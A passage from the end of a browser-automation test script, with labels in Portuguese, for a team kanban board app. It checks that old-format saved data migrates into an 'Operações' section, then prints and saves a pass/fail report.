    const v1 = { boardTitle: 'Q', columns: [{ id: 'c1', title: 'A Fazer', taskIds: ['t1'] }], tasks: { t1: { id: 't1', title: 'Formato v1', group: 'planejamento', priority: 'media' } } };
    const p4 = await newPage(browser, { seed: { fn: d => { localStorage.clear(); localStorage.setItem('equipe-kanban-v1', JSON.stringify(d)); }, arg: v1 } });
    await p4.click('#sectionNav .module-item:has-text("Operações")');
    check('formato mais antigo (seção única) vai para Operações', /Formato v1/.test(await p4.evaluate(() => document.body.innerText)));
    await p4.context().close();
  } catch(e){ check('grupo concluído sem travar', false, e.message.split('\n')[0]); for(const c of browser.contexts()) await c.close().catch(()=>{}); }

  await browser.close();
  /* ======================= RELATÓRIO ======================= */
  let pass = 0, fail = 0, notes = 0, lastGroup = '';
  for(const r of results){
    if(r.group !== lastGroup){ console.log('\n■ ' + r.group); lastGroup = r.group; }
    if(r.ok === null){ notes++; console.log('  ⚠ ' + r.name + (r.detail ? ' — ' + r.detail : '')); }
    else if(r.ok){ pass++; console.log('  ✔ ' + r.name); }
    else { fail++; console.log('  ✘ ' + r.name + (r.detail ? ' — ' + r.detail.slice(0, 300) : '')); }
  }
  console.log(`\nResultado: ${pass} passaram, ${fail} falharam, ${notes} observação(ões) — ${((Date.now() - t0) / 1000).toFixed(0)}s`);
  fs.writeFileSync(path.join(__dirname, 'last-results.json'), JSON.stringify(results, null, 2));
  process.exit(fail ? 1 : 0);
})().catch(e => { console.error('ERRO NA BATERIA:', e); process.exit(2); });
